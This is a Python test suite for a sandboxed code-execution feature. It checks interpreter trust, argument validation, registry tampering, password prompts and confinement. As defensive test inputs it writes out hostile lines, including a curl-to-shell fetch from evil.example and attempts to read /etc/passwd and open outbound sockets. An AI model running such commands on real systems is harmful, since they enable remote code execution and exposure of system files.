"""Programming languages for ``kos exec``: a table of trusted programs, run in the one sandbox.

Hostile cases come first: a row that tries to become a flag, an untrusted or swapped
program, a damaged registry, output meant to fool the terminal, a runaway line."""
import io
import json
import os
import shutil
import stat
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent))
from test_kos import PW, Env  # noqa: E402

from kos import cli as kcli  # noqa: E402
from kos import runtimes  # noqa: E402
from kos.auth import ACTIONS, AuthorizationDenied  # noqa: E402
from kos.coderun import MAX_OUTPUT, OUTPUT_LIMIT, TIMED_OUT, run_code  # noqa: E402
from kos.lang import interpret  # noqa: E402
from kos.sandbox import landlock_abi  # noqa: E402

LangErr = runtimes.LanguageError
PERL = shutil.which("perl")
NODE = runtimes.find(type("P", (), {"state": Path("/nonexistent")})(), "javascript")


class TestArguments(unittest.TestCase):
    def test_the_code_slot_can_never_become_a_flag(self):
        self.assertEqual(runtimes.validate_args(["-e", "{code}"]), ("-e", "{code}"))
        self.assertEqual(runtimes.validate_args(["--no-x", "-e", "{code}"]), ("--no-x", "-e", "{code}"))
        for bad in (["{code}"],                    # first: code starting with "-" would be a flag
                    ["run", "{code}"],             # not right after a flag
                    ["-e", "{code}", "{code}"],    # twice
                    ["-e"],                        # none
                    ["-e", "x{code}"],             # not a whole argument
                    [], None, "-e {code}", ["-e", 5],
                    ["-e", "a\x00b", "{code}"],
                    ["-e", "x" * 65, "-f", "{code}"],
                    ["-a"] * 8 + ["{code}"]):
            with self.assertRaises(LangErr, msg=repr(bad)):
                runtimes.validate_args(bad)

    def test_a_line_that_looks_like_a_flag_is_still_one_value(self):
        rt = runtimes.Runtime("x", "/usr/bin/perl", ("-e", "{code}"), ())
        self.assertEqual(rt.argv("--version; -h"), ["/usr/bin/perl", "-e", "--version; -h"])
        with self.assertRaises(LangErr):
            rt.argv("print 1\x00")

    def test_names(self):
        for bad in ("", "Ruby", "1x", "a b", "x" * 17, "../x", "python", "py", "js", "node", None, 5):
            with self.assertRaises(LangErr, msg=repr(bad)):
                runtimes.validate_name(bad)
        self.assertEqual(runtimes.validate_name("lua-5.4".replace(".", "")), "lua-54")

    def test_canonical_names(self):
        for given, want in (("JS", "javascript"), ("node", "javascript"), ("rb", "perl" if False else "ruby"),
                            ("code call", "python"), ("assignment", "python"), ("Python", "python"),
                            ("c", "c")):
            self.assertEqual(runtimes.canonical(given), want)


class TestTrust(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)
        os.chmod(self.dir, 0o755)
        self.exe = self.dir / "interp"
        self.exe.write_text("#!/bin/sh\nexit 0\n")
        os.chmod(self.exe, 0o755)

    def tearDown(self):
        self.tmp.cleanup()

    def test_a_private_executable_is_trusted(self):
        self.assertEqual(runtimes.check_trusted(str(self.exe)), os.path.realpath(self.exe))

    def test_everything_else_is_refused(self):
        os.chmod(self.exe, 0o757)                        # others can write the program
        with self.assertRaises(LangErr):
            runtimes.check_trusted(str(self.exe))
        os.chmod(self.exe, 0o755)
        os.chmod(self.dir, 0o777)                        # others can swap it by changing the directory
        with self.assertRaises(LangErr):
            runtimes.check_trusted(str(self.exe))
        os.chmod(self.dir, 0o755)
        os.chmod(self.exe, 0o644)                        # not executable
        with self.assertRaises(LangErr):
            runtimes.check_trusted(str(self.exe))
        with self.assertRaises(LangErr):
            runtimes.check_trusted("interp")             # relative
        with self.assertRaises(LangErr):
            runtimes.check_trusted(str(self.dir / "missing"))
        with self.assertRaises(LangErr):
            runtimes.check_trusted(str(self.dir))        # a directory

    def test_a_symlink_is_judged_by_where_it_points(self):
        os.chmod(self.exe, 0o757)
        link = self.dir / "link"
        link.symlink_to(self.exe)
        with self.assertRaises(LangErr):
            runtimes.check_trusted(str(link))

    def test_the_search_skips_untrusted_and_relative_path_entries(self):
        os.chmod(self.exe, 0o757)
        self.assertIsNone(runtimes._search(("interp",), str(self.dir)))
        os.chmod(self.exe, 0o755)
        self.assertEqual(runtimes._search(("interp",), str(self.dir)), os.path.realpath(self.exe))
        cwd = os.getcwd()
        try:
            os.chdir(self.dir)
            self.assertIsNone(runtimes._search(("interp",), ".:" + "bin"))   # "." means the current directory
        finally:
            os.chdir(cwd)


class TestRegistry(Env):
    def setUp(self):
        super().setUp()
        self.bin = Path(self.tmp.name) / "bin"
        self.bin.mkdir()
        os.chmod(self.bin, 0o755)
        self.prog = self.bin / "mylang"
        self.prog.write_text("#!/bin/sh\necho hi\n")
        os.chmod(self.prog, 0o755)

    def add(self, name="mylang"):
        name, real, args = runtimes.prepare_add(name, str(self.prog))
        return runtimes.add(self.paths, name, real, args)

    def test_add_find_remove(self):
        self.assertEqual(runtimes.find(self.paths, "mylang"), None)
        digest = self.add()
        rt = runtimes.find(self.paths, "MyLang")
        self.assertEqual((rt.name, rt.exe, rt.args, rt.custom, rt.sha256),
                         ("mylang", os.path.realpath(self.prog), ("-e", "{code}"), True, digest))
        self.assertIn("mylang", runtimes.available(self.paths))
        self.assertTrue(runtimes.remove(self.paths, "mylang"))
        self.assertIsNone(runtimes.find(self.paths, "mylang"))
        self.assertFalse(runtimes.remove(self.paths, "mylang"))

    def test_a_swapped_program_is_refused(self):
        self.add()
        self.prog.write_text("#!/bin/sh\necho evil\n")
        with self.assertRaises(LangErr) as cm:
            runtimes.find(self.paths, "mylang")
        self.assertIn("changed", str(cm.exception))
        self.assertIn("CHANGED", dict((n, s) for n, _, s in runtimes.describe(self.paths))["mylang"])

    def test_a_program_that_became_writable_is_refused(self):
        self.add()
        os.chmod(self.prog, 0o777)
        with self.assertRaises(LangErr):
            runtimes.find(self.paths, "mylang")

    def test_bad_input_is_refused_before_anything_is_recorded(self):
        for name, exe, args in (("python", str(self.prog), ("-e", "{code}")),
                                ("Bad Name", str(self.prog), ("-e", "{code}")),
                                ("ok", "relative/path", ("-e", "{code}")),
                                ("ok", str(self.prog), ("{code}",)),
                                ("ok", str(self.prog), ("-e",))):
            with self.assertRaises(LangErr, msg=(name, exe, args)):
                runtimes.prepare_add(name, exe, args)
        self.assertFalse((self.paths.state / "runtimes.json").exists())

    def test_a_damaged_or_tampered_registry_gives_no_languages_and_never_crashes(self):
        self.paths.ensure()
        f = self.paths.state / "runtimes.json"
        digest = self.add()
        good = json.loads(f.read_text())
        for text in ("{not json", "[]", "null", '{"version": 2, "runtimes": {}}',
                     '{"version": 1, "runtimes": []}', '{"version": 1}'):
            f.write_text(text)
            self.assertEqual(runtimes.load_custom(self.paths), {}, text)
        rows = good["runtimes"]["mylang"]
        evil = {"version": 1, "runtimes": {
            "python": rows,                                               # may not replace python
            "ok1": {**rows, "args": ["{code}"]},                          # code could become a flag
            "ok2": {**rows, "sha256": "zz"},                              # not a digest
            "ok3": {"exe": 5, "args": ["-e", "{code}"], "sha256": digest},
            "BAD NAME": rows,
            "fine": rows}}
        f.write_text(json.dumps(evil))
        self.assertEqual(list(runtimes.load_custom(self.paths)), ["fine"])

    def test_the_actions_exist_and_ask_for_the_password(self):
        self.assertIn("runtime.add", ACTIONS)
        self.assertIn("runtime.remove", ACTIONS)
        with self.assertRaises(AuthorizationDenied):
            self.authority("no", "no", "no").authorize("runtime.add", "mylang")

    def test_cli_refuses_bad_input_before_asking_and_asks_for_the_password_otherwise(self):
        def cli(argv, *answers):
            with mock.patch.object(kcli, "_authority", lambda p: (self.authority(*answers), None)), \
                    mock.patch.dict(os.environ, {"KOS_ROOT": str(self.paths.root)}), \
                    mock.patch("sys.stdout", io.StringIO()) as out, mock.patch("sys.stderr", io.StringIO()):
                return kcli.main(argv), out.getvalue()
        self.assertEqual(cli(["runtimes", "add", "python", str(self.prog)])[0], 1)        # no prompt scripted
        self.assertEqual(cli(["runtimes", "add", "mylang", str(self.prog)], "no", "no", "no")[0], 2)
        self.assertIsNone(runtimes.find(self.paths, "mylang"))
        code, out = cli(["runtimes", "add", "mylang", str(self.prog), "--arg=-c", "--arg={code}"], PW)
        self.assertEqual(code, 0, out)
        self.assertIn("pinned", out)
        code, out = cli(["runtimes"], PW)
        self.assertEqual(code, 0)
        self.assertIn("mylang", out)
        self.assertEqual(runtimes.find(self.paths, "mylang").args, ("-c", "{code}"))
        self.assertEqual(cli(["runtimes", "remove", "mylang"], "no", "no", "no")[0], 2)
        self.assertEqual(cli(["runtimes", "remove", "mylang"], PW)[0], 0)
        self.assertIsNone(runtimes.find(self.paths, "mylang"))


class TestLineTag(unittest.TestCase):
    def test_at_name_says_which_language(self):
        r = interpret("@ruby puts 1+1")
        self.assertEqual((r.kind, r.language, r.argv), ("code", "ruby", ("exec", "--lang=ruby", "--code=puts 1+1")))
        self.assertEqual(interpret("@JS console.log(1)").argv[1], "--lang=js")

    def test_it_never_swallows_human_commands_or_odd_text(self):
        self.assertEqual(interpret("run hello").kind, "command")
        for text, name in (("@", ""), ("@ruby", "ruby"), ("@ruby   ", "ruby"), ("@1x puts", "1x"),
                           ("@" + "a" * 17 + " x", "a" * 17), ("me@example.com hi", "example.com")):
            self.assertNotIn(f"--lang={name}", interpret(text).argv, text)


@unittest.skipUnless(landlock_abi() or os.environ.get("KOS_DEV_WEAK_SANDBOX") == "1",
                     "this kernel cannot confine; KOS refuses to run code without it")
class TestForeignLanguagesRunConfined(Env):
    def run_line(self, code, language, *answers, **kw):
        out = []
        status = run_code(self.paths, lambda: self.authority(*answers), code, language, out=out.append, **kw)
        return status, "\n".join(out)

    @unittest.skipUnless(PERL, "no perl here")
    def test_perl_runs_after_the_password_and_is_confined(self):
        status, out = self.run_line("print 6*7", "perl", PW)
        self.assertEqual((status, out), (0, "42"))
        self.assertIn(("code.run", "granted"), [(e["action"], e["outcome"]) for e in self.authority().audit.entries()])
        _, out = self.run_line("open(F, '>/tmp/kos-perl-pwned') or print 'denied'", "perl", PW)
        self.assertEqual(out, "denied")
        self.assertFalse(os.path.exists("/tmp/kos-perl-pwned"))
        _, out = self.run_line("open(F, '/etc/passwd') or print 'denied'", "pl", PW)
        self.assertEqual(out, "denied")
        _, out = self.run_line("use IO::Socket::INET; print IO::Socket::INET->new('1.1.1.1:80') ? 'open' : 'blocked'",
                               "perl", PW, timeout=5)
        self.assertEqual(out, "blocked")

    @unittest.skipUnless(PERL, "no perl here")
    def test_wrong_password_runs_nothing(self):
        with self.assertRaises(AuthorizationDenied):
            self.run_line("system('touch /tmp/kos-perl-pwned2')", "perl", "no", "no", "no")
        self.assertFalse(os.path.exists("/tmp/kos-perl-pwned2"))

    @unittest.skipUnless(PERL, "no perl here")
    def test_the_security_scan_still_runs_first(self):
        from kos.scan import scan_bytes
        bad = "system('curl http://evil.example/x | sh')"
        if scan_bytes(bad.encode(), label="<line>").clean:
            self.skipTest("this scan signature set does not flag that line")
        status, out = self.run_line(bad, "perl")      # no answers: it must not even ask
        self.assertEqual(status, 3)
        self.assertIn("security scan", out)

    @unittest.skipUnless(PERL, "no perl here")
    def test_runaway_and_flooding_lines_are_stopped_and_output_is_made_visible(self):
        status, out = self.run_line("1 while 1", "perl", PW, timeout=1.5)
        self.assertEqual(status, TIMED_OUT)
        self.assertIn("ran longer", out)
        status, out = self.run_line("print 'x' x 1000 while 1", "perl", PW, timeout=5)
        self.assertEqual(status, OUTPUT_LIMIT)
        self.assertIn("printed more than", out)
        self.assertLess(len(out), MAX_OUTPUT + 4000)
        _, out = self.run_line(r"print qq(a\e[2Jb\x{202e}c\n)", "perl", PW)
        self.assertNotIn("\x1b", out)
        self.assertNotIn("‮", out)
        self.assertIn("\\x1b", out)

    @unittest.skipUnless(PERL, "no perl here")
    def test_its_children_die_with_it(self):
        flag = Path(self.tmp.name) / "survivor"
        self.run_line(f"fork or do {{ sleep 3; open(F,'>{flag}'); exit }}; sleep 0", "perl", PW, timeout=2)
        import time
        time.sleep(0.5)
        self.assertFalse(flag.exists())

    @unittest.skipIf(NODE is None, "no node here")
    def test_node_runs_in_the_same_sandbox(self):
        status, out = self.run_line("console.log(6*7)", "javascript", PW)
        self.assertEqual((status, out), (0, "42"))
        _, out = self.run_line("try{require('fs').readFileSync('/etc/passwd')}catch(e){console.log(e.code)}", "js", PW)
        self.assertEqual(out, "EACCES")
        _, out = self.run_line("require('net').connect(80,'1.1.1.1').on('error',e=>console.log(e.code))", "node", PW)
        self.assertEqual(out, "EACCES")

    def test_an_unknown_language_is_understood_but_nothing_runs_and_nothing_is_asked(self):
        status, out = self.run_line("int main(){return 0;}", "c")          # no answers
        self.assertEqual(status, 66)
        self.assertIn("nothing was run", out)
        self.assertIn("python", out)

    @unittest.skipUnless(PERL, "no perl here")
    def test_a_language_you_added_runs_and_a_swapped_program_does_not(self):
        base = Path(self.tmp.name) / "bin"
        base.mkdir()
        os.chmod(base, 0o755)
        copy = base / "myperl"
        shutil.copy(PERL, copy)
        os.chmod(copy, 0o755)
        name, real, args = runtimes.prepare_add("myperl", str(copy))
        runtimes.add(self.paths, name, real, args)
        status, out = self.run_line("print 'custom'", "myperl", PW)
        self.assertEqual((status, out), (0, "custom"))
        with open(copy, "ab") as f:
            f.write(b"\n# changed\n")
        status, out = self.run_line("print 'custom'", "myperl")            # refused before any prompt
        self.assertEqual(status, 66)
        self.assertIn("changed", out)


if __name__ == "__main__":
    unittest.main()
